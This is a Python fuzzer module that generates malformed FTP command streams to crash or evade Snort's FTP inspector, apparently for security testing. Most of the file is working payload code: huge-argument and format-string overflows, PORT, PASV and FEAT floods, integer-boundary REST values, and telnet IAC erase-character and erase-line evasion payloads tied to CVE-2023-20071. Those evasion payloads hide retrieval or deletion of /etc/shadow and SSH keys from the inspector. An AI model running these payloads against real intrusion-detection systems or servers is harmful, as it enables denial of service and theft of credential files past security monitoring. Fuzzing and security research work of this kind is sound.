import random
from protocol.dynamic_data import get_commands, random_buffer_size, has_dynamic_data

FTP_STRATEGIES = [
    "cmd_overflow",
    "port_bomb",
    "pipelined_auth",
    "cwd_depth",
    "epsv_eprt_mix",
    "stray_commands",
    "boundary_port",
    "oversized_site",
    "encoding_attack",
    "rest_overflow",
    "data_channel_confusion",
    "feat_negotiate",
    "rest_data_reuse",
]

FTP_WEIGHTS = [18, 18, 12, 12, 8, 8, 4, 4, 6, 4, 4, 2, 10]

FTP_STRATEGY_LABELS = {
    "cmd_overflow":           "CMD Overflow",
    "port_bomb":              "PORT Flood",
    "pipelined_auth":         "Auth Pipeline",
    "cwd_depth":              "CWD Depth Bomb",
    "epsv_eprt_mix":          "EPSV/EPRT Mix",
    "stray_commands":         "Stray Commands",
    "boundary_port":          "Boundary PORT",
    "oversized_site":         "SITE Overflow",
    "encoding_attack":        "Encoding Attack",
    "rest_overflow":          "REST Overflow",
    "data_channel_confusion": "Data Ch. Confusion",
    "feat_negotiate":         "FEAT Negotiate",
    "rest_data_reuse":        "REST Offset Reuse UAF (CSCwu90022)",
}


def build_ftp_payload(strategy: str, payload_override=None) -> bytes:
    """
    Build a structurally valid FTP command sequence that passes Snort's
    initial FTP classification but triggers faults in deep inspection.

    Each payload starts with a valid preamble so Snort recognises it as
    FTP traffic before engaging its parser on the malicious data.
    """

    preamble = b"USER anonymous\r\nPASS anonymous@test.com\r\n"

    if strategy == "cmd_overflow":
        # Massive USER argument — overflows Snort's per-command argument
        # allocation in the ftp_cmd_conf lookup path.
        return b"USER " + (b"A" * 65000) + b"\r\n"

    elif strategy == "port_bomb":
        # Thousands of PORT commands → each causes Snort to allocate and
        # register a new data-channel tracking entry. Exhausts the session's
        # data-channel table and leaks memory across sessions.
        lines = [preamble]
        for _ in range(3000):
            p1 = random.randint(4, 255)
            p2 = random.randint(1, 255)
            host_part = random.randint(1, 254)
            lines.append(f"PORT 127,0,0,{host_part},{p1},{p2}\r\n".encode())
        return b"".join(lines)

    elif strategy == "pipelined_auth":
        # Pipeline thousands of USER/PASS pairs in one TCP segment.
        # Forces Snort's auth-state machine through rapid transitions which
        # can corrupt its internal session-state counters..
        pair = b"USER anonymous\r\nPASS anonymous@test.com\r\n"
        return pair * 4000

    elif strategy == "cwd_depth":
        # Extremely deep directory path — triggers recursive path-component
        # parsing that may blow the inspector's call stack or hit allocation
        # limits inside ftp_bounce / directory-traversal detection code.
        path = b"/a" * 8000
        return preamble + b"CWD " + path + b"\r\n"

    elif strategy == "epsv_eprt_mix":
        # Rapidly alternate EPSV (extended passive) and EPRT (extended active,
        # IPv6-style) commands. Snort must track mode switches and validate
        # EPRT address families. Mixing fills its mode-state tracker.
        lines = [preamble]
        for i in range(2000):
            if i % 2 == 0:
                lines.append(b"EPSV\r\n")
            else:
                port = random.randint(1024, 65535)
                host = random.randint(1, 254)
                lines.append(f"EPRT |1|127.0.0.{host}|{port}|\r\n".encode())
        return b"".join(lines)

    elif strategy == "stray_commands":
        # Send privileged data-transfer commands before authentication.
        # Snort's state machine must reject them, but the volume of illegal
        # transitions can overflow its command-history buffer.
        cmds = [
            b"RETR /etc/passwd\r\n",
            b"STOR /tmp/exploit\r\n",
            b"DELE /root/.ssh/authorized_keys\r\n",
            b"RMD /var/log\r\n",
            b"MKD /evil\r\n",
            b"ABOR\r\n",
            b"STAT\r\n",
            b"MLSD /\r\n",
        ]
        # Augment with dynamically extracted commands from source analysis
        if has_dynamic_data():
            for dc in get_commands():
                cmds.append(dc.encode("utf-8", errors="replace") + b" /fuzz\r\n")
        return b"".join(random.choice(cmds) for _ in range(2000))

    elif strategy == "boundary_port":
        # Boundary and overflow values in PORT parameters.
        # Tests integer-parsing robustness in the data-channel IP/port decoder.
        payloads = [
            b"PORT 0,0,0,0,0,0\r\n",
            b"PORT 255,255,255,255,255,255\r\n",
            b"PORT 127,0,0,1,99999999,99999999\r\n",
            b"PORT 127,0,0,1,0,0\r\n",
            b"PORT -1,-1,-1,-1,-1,-1\r\n",
        ]
        return preamble + b"".join(payloads * 4000)

    elif strategy == "oversized_site":
        # SITE EXEC with a massive argument mixing format specifiers and
        # random data — targets the SITE handler and any logging path that
        # does unsafe string operations on command arguments.
        arg = (b"%n%s%x%d" * 100) + (b"A" * 32000)
        return preamble + b"SITE EXEC " + arg + b"\r\n"

    elif strategy == "encoding_attack":
        if payload_override is not None:
            overlong_slash = b'\xc0\xaf'
            path = overlong_slash.join(
                [payload_override[i:i+4] for i in range(0, len(payload_override), 4)]
            )
            return preamble + b"RETR " + path + b"\r\n"
        # Encoding-based attacks targeting Snort's FTP command normalization.
        # Tests null bytes, UTF-8 BOM, backslash confusion, and overlong UTF-8.
        variant = random.choice([
            "null_byte", "utf8_bom", "backslash_path", "overlong_utf8",
            "mixed_line_endings", "telnet_iac",
            # CVE-2023-20071 inspired: telnet EAC/EAL semantic-gap evasion
            "telnet_eac_evasion", "telnet_eal_wipe",
            "iac_mid_command", "iac_segment_boundary",
        ])
        if variant == "null_byte":
            # Null byte injection in CWD path — tests if Snort truncates at \x00
            # while the FTP server processes the full string.
            paths = [
                b"CWD /safe\x00/../../../etc/passwd\r\n",
                b"RETR /public\x00/../../root/.ssh/id_rsa\r\n",
                b"MKD /tmp/\x00\x00\x00" + b"A" * 1000 + b"\r\n",
            ]
            return preamble + b"".join(paths * 500)
        elif variant == "utf8_bom":
            # UTF-8 BOM prefix before commands — may confuse command parsing.
            bom = b'\xef\xbb\xbf'
            lines = [preamble]
            for _ in range(2000):
                lines.append(bom + b"CWD /test\r\n")
            return b"".join(lines)
        elif variant == "backslash_path":
            # Windows-style backslash paths mixed with forward slashes.
            # Snort normalizes paths; conflicting separators stress the normalizer.
            lines = [preamble]
            for i in range(2000):
                sep = b"\\" if i % 2 == 0 else b"/"
                path = sep.join([b"dir" + str(i % 100).encode()] * 20)
                lines.append(b"CWD " + path + b"\r\n")
            return b"".join(lines)
        elif variant == "overlong_utf8":
            # Overlong UTF-8 encoding of '/' (U+002F): C0 AF instead of 2F.
            # A WAF/IDS bypass technique — the path looks different to Snort
            # but the server may decode it as '/'.
            overlong_slash = b'\xc0\xaf'
            path = overlong_slash.join([b"etc", b"passwd"])
            lines = [preamble]
            for _ in range(1500):
                lines.append(b"RETR " + path + b"\r\n")
            return b"".join(lines)
        elif variant == "mixed_line_endings":
            # Mix \r\n, \n, \r, and bare \n to confuse line-based parsing.
            endings = [b"\r\n", b"\n", b"\r", b"\n\r", b"\r\r\n"]
            lines = [preamble]
            for _ in range(3000):
                cmd = random.choice([b"NOOP", b"STAT", b"SYST", b"HELP"])
                lines.append(cmd + random.choice(endings))
            return b"".join(lines)
        elif variant == "telnet_iac":
            # Telnet IAC sequences embedded in FTP stream (FTP runs over Telnet).
            # IAC sequences should be stripped; malformed ones confuse the parser.
            iac_cmds = [b'\xff\xf4', b'\xff\xf2', b'\xff\xfb\x03',
                        b'\xff\xfd\x18', b'\xff\xfe\x01', b'\xff\xff']
            lines = [preamble]
            for _ in range(2000):
                lines.append(random.choice(iac_cmds) + b"NOOP\r\n")
            return b"".join(lines)
        elif variant == "telnet_eac_evasion":
            # CVE-2023-20071: IAC EAC (0xFF 0xF7) erases the previous character.
            # Inject EAC sequences within file-access commands to create a
            # semantic gap — Snort sees one filename, the server sees another.
            # Example: "RETR safe.txt" + 8×EAC + "malw.exe" →
            #   Snort (ignore_erase=true): "RETR safe.txtmalw.exe" (benign)
            #   Server (processes erase):  "RETR malw.exe" (malicious)
            IAC_EAC = b'\xff\xf7'
            decoys = [b"safe.txt", b"readme.md", b"index.html", b"pubkey.pem"]
            targets = [b"../../etc/passwd", b"../admin/config.db",
                       b"/root/.ssh/id_rsa", b"..\\..\\windows\\system32\\sam"]
            lines = [preamble]
            for _ in range(500):
                decoy = random.choice(decoys)
                target = random.choice(targets)
                cmd = random.choice([b"RETR", b"STOR", b"DELE", b"RMD"])
                # N EAC sequences to erase the decoy, then the real target
                erase = IAC_EAC * len(decoy)
                lines.append(cmd + b" " + decoy + erase + target + b"\r\n")
            return b"".join(lines)
        elif variant == "telnet_eal_wipe":
            # CVE-2023-20071: IAC EAL (0xFF 0xF8) erases the entire current line.
            # Send a dangerous command, then EAL + benign command on same line.
            # Snort may see only the benign part; server may execute the dangerous part.
            IAC_EAL = b'\xff\xf8'
            lines = [preamble]
            for _ in range(500):
                # Pattern: dangerous_cmd + EAL + benign_cmd
                dangerous = random.choice([
                    b"DELE /etc/shadow",
                    b"RMD /var/log",
                    b"STOR /root/.ssh/authorized_keys",
                    b"RETR /etc/passwd",
                ])
                benign = random.choice([b"NOOP", b"STAT", b"PWD", b"SYST"])
                lines.append(dangerous + IAC_EAL + benign + b"\r\n")
            return b"".join(lines)
        elif variant == "iac_mid_command":
            # CVE-2023-20071: Insert multi-byte IAC option negotiation sequences
            # (WILL/WONT/DO/DONT + option byte) in the middle of FTP commands.
            # Snort must strip the 3-byte sequence to see the real command;
            # incorrect stripping corrupts the parsed command or loses state.
            iac_opts = [
                b'\xff\xfb\x01',  # IAC WILL ECHO
                b'\xff\xfb\x03',  # IAC WILL SGA
                b'\xff\xfc\x01',  # IAC WONT ECHO
                b'\xff\xfd\x18',  # IAC DO TERMINAL-TYPE
                b'\xff\xfe\x20',  # IAC DONT LINEMODE
                b'\xff\xfa\x18\x00\xff\xf0',  # IAC SB TERMINAL-TYPE IS IAC SE
            ]
            lines = [preamble]
            for _ in range(500):
                cmd = random.choice([b"RETR secret.dat", b"CWD /admin",
                                     b"STOR payload.bin", b"LIST -la"])
                # Insert IAC sequence at random position within the command
                pos = random.randint(1, len(cmd) - 1)
                iac = random.choice(iac_opts)
                mangled = cmd[:pos] + iac + cmd[pos:]
                lines.append(mangled + b"\r\n")
            return b"".join(lines)
        else:  # iac_segment_boundary
            # CVE-2023-20071: Split IAC escape sequences across TCP segment
            # boundaries. The 0xFF byte ends one segment; the escape code
            # (0xF7/0xF8) starts the next. Tests whether Snort correctly
            # reassembles before normalizing telnet escapes in FTP.
            IAC = b'\xff'
            escape_codes = [b'\xf7', b'\xf8', b'\xf4', b'\xf2']
            lines = [preamble]
            for _ in range(200):
                cmd = random.choice([b"RETR ", b"STOR ", b"CWD ", b"DELE "])
                path = random.choice([b"/etc/passwd", b"/admin/db.sqlite",
                                      b"../../../root/.bashrc"])
                # Build: cmd + partial_path + IAC (segment break) + escape + rest
                split = random.randint(1, len(path) - 1)
                lines.append(cmd + path[:split] + IAC)
                lines.append(random.choice(escape_codes) + path[split:] + b"\r\n")
            return b"".join(lines)

    elif strategy == "rest_overflow":
        # REST (restart position) with boundary integer values.
        # Targets Snort's file position tracking — large REST values
        # may cause integer overflow in offset calculations.
        variant = random.choice([
            "max_int", "negative", "sequential_overflow", "rest_before_illegal",
        ])
        if variant == "max_int":
            # REST with values near LLONG_MAX and ULLONG_MAX.
            values = [
                b"9223372036854775807",   # LLONG_MAX
                b"9223372036854775808",   # LLONG_MAX + 1
                b"18446744073709551615",  # ULLONG_MAX
                b"18446744073709551616",  # ULLONG_MAX + 1
                b"99999999999999999999999999999",  # way beyond any int
            ]
            lines = [preamble]
            for v in values * 400:
                lines.append(b"REST " + v + b"\r\n")
                lines.append(b"RETR /test.bin\r\n")
            return b"".join(lines)
        elif variant == "negative":
            # Negative REST values — tests signed/unsigned confusion.
            lines = [preamble]
            for _ in range(1000):
                val = str(-random.randint(1, 2**31)).encode()
                lines.append(b"REST " + val + b"\r\n")
            return b"".join(lines)
        elif variant == "sequential_overflow":
            # Rapidly incrementing REST values that wrap around integer boundaries.
            lines = [preamble]
            for i in range(2000):
                val = str((2**31 - 1000) + i).encode()
                lines.append(b"REST " + val + b"\r\nRETR /data.bin\r\n")
            return b"".join(lines)
        else:  # rest_before_illegal
            # REST followed by commands that shouldn't accept a restart position.
            lines = [preamble]
            illegals = [b"LIST", b"NLST", b"MLSD", b"STAT", b"DELE"]
            for _ in range(1000):
                lines.append(b"REST 4294967295\r\n")
                lines.append(random.choice(illegals) + b" /\r\n")
            return b"".join(lines)

    elif strategy == "data_channel_confusion":
        # Rapidly switch between active/passive modes and issue data commands
        # without completing the data channel handshake.
        variant = random.choice([
            "pasv_storm", "port_pasv_interleave", "simultaneous_transfers",
            "aborted_transfers",
        ])
        if variant == "pasv_storm":
            # 5000 PASV requests without ever connecting to the data port.
            # Each PASV allocates a listening socket on the server side;
            # Snort must track all pending data channels.
            lines = [preamble]
            for _ in range(5000):
                lines.append(b"PASV\r\n")
            return b"".join(lines)
        elif variant == "port_pasv_interleave":
            # Alternate PORT and PASV rapidly — confuses data channel direction tracking.
            lines = [preamble]
            for i in range(3000):
                if i % 2 == 0:
                    p1, p2 = random.randint(4, 255), random.randint(1, 255)
                    lines.append(f"PORT 127,0,0,1,{p1},{p2}\r\n".encode())
                else:
                    lines.append(b"PASV\r\n")
                if i % 10 == 9:
                    lines.append(b"LIST\r\n")
            return b"".join(lines)
        elif variant == "simultaneous_transfers":
            # Issue multiple RETR/STOR without waiting for completion.
            # FTP protocol says one transfer at a time; violations stress state tracking.
            lines = [preamble, b"PASV\r\n"]
            for i in range(2000):
                cmd = random.choice([b"RETR", b"STOR", b"APPE", b"LIST"])
                lines.append(cmd + f" /file{i}.dat\r\n".encode())
            return b"".join(lines)
        else:  # aborted_transfers
            # Start transfer then immediately ABOR, rapidly. Tests cleanup paths.
            lines = [preamble]
            for _ in range(2000):
                lines.append(b"PASV\r\n")
                lines.append(b"RETR /data.bin\r\n")
                lines.append(b"ABOR\r\n")
            return b"".join(lines)

    elif strategy == "feat_negotiate":
        # Feature negotiation and TLS handshake confusion.
        # Tests Snort's handling of FTP security extensions.
        variant = random.choice([
            "auth_tls_cleartext", "feat_flood", "opts_overflow", "mode_switching",
        ])
        if variant == "auth_tls_cleartext":
            # Send AUTH TLS then continue in cleartext — Snort may expect encrypted
            # data after AUTH TLS and stop inspecting, allowing evasion.
            if payload_override is not None:
                return (b"AUTH TLS\r\n" + preamble +
                        b"STOR payload.bin\r\n" + payload_override + b"\r\n")
            lines = [
                b"AUTH TLS\r\n",
                preamble,  # continue in cleartext after requesting TLS
                b"CWD /etc\r\n",
                b"RETR /etc/shadow\r\n",
            ]
            return b"".join(lines * 500)
        elif variant == "feat_flood":
            # 5000 FEAT requests — each causes Snort to parse the server's
            # feature list response. Volume tests feature-state allocation.
            return preamble + b"FEAT\r\n" * 5000
        elif variant == "opts_overflow":
            # OPTS with massive arguments for various features.
            lines = [preamble]
            features = [b"UTF8", b"MLST", b"PASV", b"EPSV"]
            for _ in range(2000):
                feat = random.choice(features)
                arg = b";" + (b"A" * random.randint(100, 5000))
                lines.append(b"OPTS " + feat + arg + b"\r\n")
            return b"".join(lines)
        else:  # mode_switching
            # Rapidly switch transfer modes (TYPE, MODE, STRU) — each changes
            # how Snort interprets the data channel.
            lines = [preamble]
            types = [b"TYPE A", b"TYPE I", b"TYPE E", b"TYPE L 8", b"TYPE A N"]
            modes = [b"MODE S", b"MODE B", b"MODE C"]
            strus = [b"STRU F", b"STRU R", b"STRU P"]
            for _ in range(3000):
                lines.append(random.choice(types + modes + strus) + b"\r\n")
                if random.random() < 0.3:
                    lines.append(b"LIST\r\n")
            return b"".join(lines)

    elif strategy == "rest_data_reuse":
        # CSCwu90022: REST command reuse — sets a restart offset, initiates
        # a transfer, ABORTs, then reuses the same REST offset on a different
        # data channel mode. Snort's file-position tracker may hold a stale
        # reference to the aborted channel's state when the offset is reused.
        variant = random.choice([
            "rest_abort_reuse", "rest_pasv_port_switch",
            "rest_multi_channel_race", "rest_offset_accumulate",
            "rest_concurrent_transfers",
        ])
        if variant == "rest_abort_reuse":
            lines = [preamble]
            for _ in range(500):
                offset = str(random.randint(0, 2**32 - 1)).encode()
                lines.append(b"REST " + offset + b"\r\n")
                lines.append(b"RETR /data.bin\r\n")
                lines.append(b"ABOR\r\n")
                lines.append(b"REST " + offset + b"\r\n")
                lines.append(b"STOR /upload.bin\r\n")
                lines.append(b"ABOR\r\n")
            return b"".join(lines)
        elif variant == "rest_pasv_port_switch":
            lines = [preamble]
            for i in range(500):
                offset = str((2**31 - 500) + i).encode()
                lines.append(b"REST " + offset + b"\r\n")
                if i % 2 == 0:
                    lines.append(b"PASV\r\n")
                else:
                    p1, p2 = random.randint(4, 255), random.randint(1, 255)
                    lines.append(f"PORT 127,0,0,1,{p1},{p2}\r\n".encode())
                lines.append(b"RETR /data.bin\r\n")
                lines.append(b"ABOR\r\n")
            return b"".join(lines)
        elif variant == "rest_multi_channel_race":
            lines = [preamble]
            for i in range(300):
                offset = str(random.randint(2**30, 2**31)).encode()
                lines.append(b"REST " + offset + b"\r\n")
                lines.append(b"PASV\r\n")
                lines.append(b"RETR /file1.dat\r\n")
                lines.append(b"REST " + offset + b"\r\n")
                lines.append(b"RETR /file2.dat\r\n")
            return b"".join(lines)
        elif variant == "rest_offset_accumulate":
            lines = [preamble]
            for i in range(1000):
                lines.append(b"REST " + str(i * 65536).encode() + b"\r\n")
            lines.append(b"RETR /payload.bin\r\n")
            return b"".join(lines)
        else:
            lines = [preamble]
            for i in range(200):
                offset = str(random.randint(0, 2**32 - 1)).encode()
                lines.append(b"REST " + offset + b"\r\n")
                lines.append(b"PASV\r\n")
                lines.append(b"RETR /file_a.dat\r\n")
                lines.append(b"STOR /file_b.dat\r\n")
                lines.append(b"ABOR\r\n")
            return b"".join(lines)

    else:
        return preamble


class FtpMutator:
    def __init__(self, external_weights: dict = None, bandit=None):
        self.strategies = FTP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return FTP_WEIGHTS

    def mutate(self, payload_override=None) -> tuple:
        """Returns (payload_bytes, strategy_name)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_ftp_payload(strategy, payload_override=payload_override)
        return payload, strategy
